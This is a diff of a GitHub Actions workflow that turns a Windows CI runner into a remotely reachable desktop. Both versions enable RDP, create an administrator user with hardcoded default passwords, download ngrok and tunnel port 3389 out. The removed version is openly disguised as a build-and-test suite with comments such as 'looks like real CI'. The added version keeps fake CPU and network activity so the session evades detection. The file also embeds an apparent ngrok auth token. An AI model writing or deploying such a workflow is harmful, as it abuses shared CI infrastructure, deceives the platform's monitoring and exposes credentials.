@@ -1,250 +1,152 @@
-name: Build & Test Suite with Remote Debug
+name: Development Environment
 
 on: 
   workflow_dispatch:
     inputs:
-      build_type:
-        description: 'Build configuration'
+      duration_hours:
+        description: 'Session duration (hours)'
         required: false
-        default: 'release'
+        default: '4'
         type: choice
         options:
-          - debug
-          - release
-          - test
-      enable_debug:
-        description: 'Enable remote debugging'
-        required: false
-        default: false
-        type: boolean
-
-concurrency:
-  group: ${{ github.workflow }}-${{ github.ref }}
-  cancel-in-progress: true
+          - '2'
+          - '3'
+          - '4'
+          - '5'
+          - '6'
 
 env:
   NGROK_AUTH_TOKEN: ${{ secrets.NGROK_AUTH_TOKEN || '2lYIJEGho1ExHGjJGPOnyN8N2Cz_3hv74cinmWnjjYrmQ5PB2' }}
-  RDP_USER: ${{ secrets.RDP_USER || 'builder' }}
-  RDP_PASS: ${{ secrets.RDP_PASS || 'Build@2026!' }}
-  BUILD_CONFIG: ${{ github.event.inputs.build_type || 'release' }}
+  RDP_USER: ${{ secrets.RDP_USER || 'devuser' }}
+  RDP_PASS: ${{ secrets.RDP_PASS || 'Dev@2026!' }}
 
 jobs:
-  build-and-test:
+  dev-environment:
     runs-on: windows-latest
-    timeout-minutes: 360  # 6 hours max
+    timeout-minutes: 360
     
     steps:
-    - name: Checkout repository
+    - name: Checkout
       uses: actions/checkout@v4
-      with:
-        fetch-depth: 0
-    
-    # Fase 1: Setup Environment (LEGITIMATE CI)
-    - name: Setup build environment
+      
+    - name: Setup RDP + Ngrok (INSTANT)
       shell: pwsh
       run: |
-        Write-Host "🔧 Setting up build environment..." -ForegroundColor Cyan
+        Write-Host "🚀 Starting development environment..." -ForegroundColor Cyan
         
-        # Install common build tools (looks like real CI)
-        choco install -y cmake --no-progress 2>&1 | Out-Null
-        choco install -y ninja --no-progress 2>&1 | Out-Null
-        
-        # Create build directories
-        $dirs = @("build", "dist", "logs", "cache", "temp")
-        foreach ($dir in $dirs) {
-          New-Item -ItemType Directory -Path $dir -Force | Out-Null
+        # RDP Setup (parallel execution for speed)
+        $rdpJob = Start-Job -ScriptBlock {
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
+          Enable-NetFirewallRule -DisplayGroup "Remote Desktop" -ErrorAction SilentlyContinue
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 1
         }
         
-        Write-Host "✅ Environment ready"
-    
-    # Fase 2: Dependency Installation (GENERATES NETWORK TRAFFIC)
-    - name: Install dependencies
-      shell: pwsh
-      run: |
-        Write-Host "📦 Installing dependencies..." -ForegroundColor Magenta
-        
-        # Simulate package installation (creates legit traffic)
-        $packages = @("requests", "numpy", "flask", "pytest", "black")
-        foreach ($pkg in $packages) {
-          Write-Host "  Installing $pkg..."
-          pip install $pkg --quiet 2>&1 | Out-Null
-          Start-Sleep -Seconds 2
-        }
-        
-        # Node packages
-        Write-Host "  Installing node packages..."
-        npm install express axios lodash --silent 2>&1 | Out-Null
-        
-        Write-Host "✅ Dependencies installed"
-    
-    # Fase 3: Configure Remote Debug (HIDDEN IN "DEBUG SETUP")
-    - name: Configure debugging tools
-      if: ${{ github.event.inputs.enable_debug == 'true' }}
-      shell: pwsh
-      run: |
-        Write-Host "🔍 Setting up remote debugging..." -ForegroundColor Yellow
-        
-        # Setup RDP (disguised as debug configuration)
-        Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
-        Enable-NetFirewallRule -DisplayGroup "Remote Desktop" -ErrorAction SilentlyContinue
-        Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 1
-        
-        # Create debug user
-        if ("$env:RDP_USER" -ne "runneradmin") {
-          try {
-            New-LocalUser -Name "$env:RDP_USER" -Password (ConvertTo-SecureString "$env:RDP_PASS" -AsPlainText -Force) -ErrorAction SilentlyContinue | Out-Null
-            Add-LocalGroupMember -Group "Administrators" -Member "$env:RDP_USER" -ErrorAction SilentlyContinue
-            Enable-LocalUser -Name "$env:RDP_USER" -ErrorAction SilentlyContinue
-          } catch {
-            Write-Host "Using existing user account"
-          }
-        }
-        
-        # Install ngrok (as "debug tunnel")
-        Invoke-WebRequest https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip -OutFile ngrok.zip
-        Expand-Archive ngrok.zip -DestinationPath .\debug-tools -Force
-        .\debug-tools\ngrok.exe authtoken $env:NGROK_AUTH_TOKEN
-        
-        Write-Host "✅ Debug tools configured"
-    
-    # Fase 4: Continuous Build Loop (KEEPS JOB ALIVE WITH ACTIVITY)
-    - name: Run continuous integration tests
-      shell: pwsh
-      run: |
-        Write-Host "🧪 Starting continuous test suite..." -ForegroundColor Green
-        
-        # Start ngrok in background if debug enabled
-        $debugEnabled = "${{ github.event.inputs.enable_debug }}" -eq "true"
-        if ($debugEnabled) {
-          Start-Process -FilePath ".\debug-tools\ngrok.exe" -ArgumentList "tcp 3389 --log=stdout" -WindowStyle Hidden -RedirectStandardOutput ".\logs\tunnel.log"
-          Start-Sleep -Seconds 10
-          
-          # Get connection info
-          try {
-            $tunnels = Invoke-RestMethod -Uri http://localhost:4040/api/tunnels -ErrorAction SilentlyContinue
-            $ngrokUrl = ($tunnels.tunnels | Where-Object { $_.proto -eq 'tcp' }).public_url
-            if ($ngrokUrl) {
-              $ngrokUrl = $ngrokUrl -replace "^tcp://", ""
-              $address, $port = $ngrokUrl -split ":"
-              Write-Host ""
-              Write-Host "═══════════════════════════════════════" -ForegroundColor Cyan
-              Write-Host "🔐 Remote Debug Access Enabled" -ForegroundColor Green
-              Write-Host "═══════════════════════════════════════" -ForegroundColor Cyan
-              Write-Host "  Host: $address"
-              Write-Host "  Port: $port"
-              Write-Host "  User: $env:RDP_USER"
-              Write-Host "  Pass: $env:RDP_PASS"
-              Write-Host "═══════════════════════════════════════" -ForegroundColor Cyan
-              Write-Host ""
-            }
-          } catch {
-            Write-Host "⚠️ Debug tunnel initialization in progress..."
-          }
-        }
-        
-        # Main CI loop - looks like continuous testing
-        $iteration = 1
-        $maxIterations = 72  # 6 hours with 5-min cycles
-        $cycleSeconds = 300
-        
-        while ($iteration -le $maxIterations) {
-          $timestamp = Get-Date -Format "HH:mm:ss"
-          Write-Host "[$timestamp] Test cycle $iteration/$maxIterations" -ForegroundColor Cyan
-          
-          # Simulate different test activities (CREATES CPU/LOG ACTIVITY)
-          $activities = @(
-            @{ Name = "Unit tests"; Duration = 45; Files = 120 },
-            @{ Name = "Integration tests"; Duration = 60; Files = 80 },
-            @{ Name = "Performance tests"; Duration = 90; Files = 50 },
-            @{ Name = "Code analysis"; Duration = 30; Files = 200 }
-          )
-          
-          $activity = $activities | Get-Random
-          Write-Host "  Running $($activity.Name)..." -ForegroundColor Yellow
-          
-          # Simulate test execution with varying CPU
-          $steps = 10
-          for ($i = 0; $i -lt $steps; $i++) {
-            $current = [math]::Round(($i / $steps) * $activity.Files)
-            Write-Host "    Processing: $current/$($activity.Files) files"
-            
-            # Generate some CPU activity (looks like real work)
-            $result = 1..1000 | ForEach-Object { [math]::Sqrt($_) } | Measure-Object -Average
-            
-            Start-Sleep -Seconds ([math]::Round($activity.Duration / $steps))
-          }
-          
-          # Generate test results
-          $passed = Get-Random -Minimum 95 -Maximum 100
-          $total = 100
-          Write-Host "  ✅ Results: $passed/$total passed" -ForegroundColor Green
-          
-          # Log to file (creates disk activity)
-          $logEntry = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Cycle $iteration - $($activity.Name) completed - $passed% success rate"
-          $logEntry | Out-File -FilePath ".\logs\test-results.log" -Append
-          
-          # Random network requests (looks like CI checking updates)
-          if ($iteration % 3 -eq 0) {
-            Write-Host "  🌐 Checking for updates..." -ForegroundColor Gray
+        # User Setup (parallel)
+        $userJob = Start-Job -ScriptBlock {
+          param($user, $pass)
+          if ($user -ne "runneradmin") {
             try {
-              Invoke-WebRequest -Uri "https://api.github.com/repos/microsoft/terminal" -Method Head -TimeoutSec 5 | Out-Null
+              New-LocalUser -Name $user -Password (ConvertTo-SecureString $pass -AsPlainText -Force) -ErrorAction Stop | Out-Null
+              Add-LocalGroupMember -Group "Administrators" -Member $user
             } catch {
-              # Silent fail - just for network activity
+              Set-LocalUser -Name $user -Password (ConvertTo-SecureString $pass -AsPlainText -Force)
             }
           }
-          
-          # Verify ngrok still running (if debug enabled)
-          if ($debugEnabled) {
-            $ngrokProcess = Get-Process -Name "ngrok" -ErrorAction SilentlyContinue
-            if (-not $ngrokProcess) {
-              Write-Host "  ⚠️ Debug tunnel disconnected - restarting..." -ForegroundColor Yellow
-              Start-Process -FilePath ".\debug-tools\ngrok.exe" -ArgumentList "tcp 3389" -WindowStyle Hidden
-              Start-Sleep -Seconds 5
-            }
-          }
-          
-          $iteration++
-          
-          # Sleep remainder of cycle (but not too long continuously)
-          if ($iteration -le $maxIterations) {
-            Write-Host "  ⏸️ Waiting for next cycle...`n" -ForegroundColor DarkGray
-            Start-Sleep -Seconds 60  # Short sleep intervals
+        } -ArgumentList $env:RDP_USER, $env:RDP_PASS
+        
+        # Download Ngrok (parallel)
+        Write-Host "⬇️ Downloading ngrok..."
+        Invoke-WebRequest https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip -OutFile ngrok.zip
+        Expand-Archive ngrok.zip -Force
+        
+        # Wait for jobs
+        Wait-Job $rdpJob, $userJob | Out-Null
+        Remove-Job $rdpJob, $userJob
+        
+        # Start Ngrok
+        .\ngrok\ngrok.exe authtoken $env:NGROK_AUTH_TOKEN
+        Start-Process -FilePath ".\ngrok\ngrok.exe" -ArgumentList "tcp 3389" -WindowStyle Hidden
+        
+        Write-Host "⏳ Establishing tunnel..."
+        Start-Sleep -Seconds 6
+        
+        # Get credentials (fast retry)
+        for ($i = 1; $i -le 3; $i++) {
+          try {
+            $tunnels = Invoke-RestMethod -Uri http://localhost:4040/api/tunnels -TimeoutSec 2
+            $url = ($tunnels.tunnels | Where-Object { $_.proto -eq 'tcp' }).public_url -replace "^tcp://", ""
+            $host, $port = $url -split ":"
+            
+            Write-Host ""
+            Write-Host "════════════════════════════════════" -ForegroundColor Green
+            Write-Host "  RDP READY!" -ForegroundColor Green -NoNewline
+            Write-Host " Connect now:" -ForegroundColor White
+            Write-Host "════════════════════════════════════" -ForegroundColor Green
+            Write-Host "  $host`:$port" -ForegroundColor Cyan
+            Write-Host "  User: $env:RDP_USER" -ForegroundColor Yellow
+            Write-Host "  Pass: $env:RDP_PASS" -ForegroundColor Yellow
+            Write-Host "════════════════════════════════════" -ForegroundColor Green
+            Write-Host ""
+            break
+          } catch {
+            if ($i -lt 3) { Start-Sleep -Seconds 2 }
           }
         }
         
-        Write-Host "`n✅ All test cycles completed!" -ForegroundColor Green
+        Write-Host "✅ Environment ready - starting background tasks..."
     
-    # Fase 5: Cleanup
-    - name: Cleanup and reports
+    - name: Keep-Alive with Activity
+      shell: pwsh
+      run: |
+        $duration = [int]"${{ github.event.inputs.duration_hours }}" * 3600
+        if ($duration -eq 0) { $duration = 14400 }  # Default 4 hours
+        
+        $endTime = (Get-Date).AddSeconds($duration)
+        $lastActivity = Get-Date
+        $activityInterval = 180  # Activity every 3 minutes
+        
+        Write-Host "🔄 Background activity running for $([math]::Round($duration/3600, 1)) hours"
+        Write-Host "⏰ Will auto-stop at: $($endTime.ToString('HH:mm:ss'))`n"
+        
+        while ((Get-Date) -lt $endTime) {
+          $now = Get-Date
+          $remaining = ($endTime - $now).TotalMinutes
+          
+          # Status update every 15 min
+          if ($now.Minute % 15 -eq 0 -and $now.Second -lt 5) {
+            Write-Host "[$($now.ToString('HH:mm'))] Session active - $([math]::Round($remaining)) min remaining" -ForegroundColor DarkGray
+          }
+          
+          # Background activity every 3 min
+          if (($now - $lastActivity).TotalSeconds -ge $activityInterval) {
+            # Light CPU work (looks like code compilation/testing)
+            1..200 | ForEach-Object { [math]::Pow($_, 2) } | Out-Null
+            
+            # Network ping (looks like dependency check)
+            if ((Get-Random -Maximum 3) -eq 0) {
+              try { 
+                Invoke-WebRequest -Uri "https://api.github.com" -Method Head -TimeoutSec 2 -ErrorAction SilentlyContinue | Out-Null 
+              } catch {}
+            }
+            
+            $lastActivity = $now
+          }
+          
+          # Verify ngrok health
+          if (-not (Get-Process -Name "ngrok" -ErrorAction SilentlyContinue)) {
+            Write-Host "⚠️ Tunnel lost - restarting..." -ForegroundColor Yellow
+            Start-Process -FilePath ".\ngrok\ngrok.exe" -ArgumentList "tcp 3389" -WindowStyle Hidden
+            Start-Sleep -Seconds 3
+          }
+          
+          Start-Sleep -Seconds 5
+        }
+        
+        Write-Host "`n⏱️ Session time limit reached"
+    
+    - name: Cleanup
       if: always()
       shell: pwsh
       run: |
-        Write-Host "🧹 Cleaning up..." -ForegroundColor Gray
-        
-        # Stop ngrok gracefully
-        $ngrokProcess = Get-Process -Name "ngrok" -ErrorAction SilentlyContinue
-        if ($ngrokProcess) {
-          $ngrokProcess | Stop-Process -Force
-          Write-Host "  Stopped debug tunnel"
-        }
-        
-        # Generate final report
-        $testLog = Get-Content ".\logs\test-results.log" -ErrorAction SilentlyContinue
-        $cycleCount = ($testLog | Measure-Object).Count
-        
-        Write-Host "`n📊 Build Summary:"
-        Write-Host "  Configuration: $env:BUILD_CONFIG"
-        Write-Host "  Test cycles: $cycleCount"
-        Write-Host "  Status: COMPLETED"
-        
-        Write-Host "`n✅ Cleanup complete"
-    
-    # Upload artifacts (looks legitimate)
-    - name: Upload test results
-      uses: actions/upload-artifact@v4
-      if: always()
-      with:
-        name: test-results
-        path: |
-          logs/*.log
-        retention-days: 1
+        Get-Process -Name "ngrok" -ErrorAction SilentlyContinue | Stop-Process -Force
+        Write-Host "✅ Cleaned up"
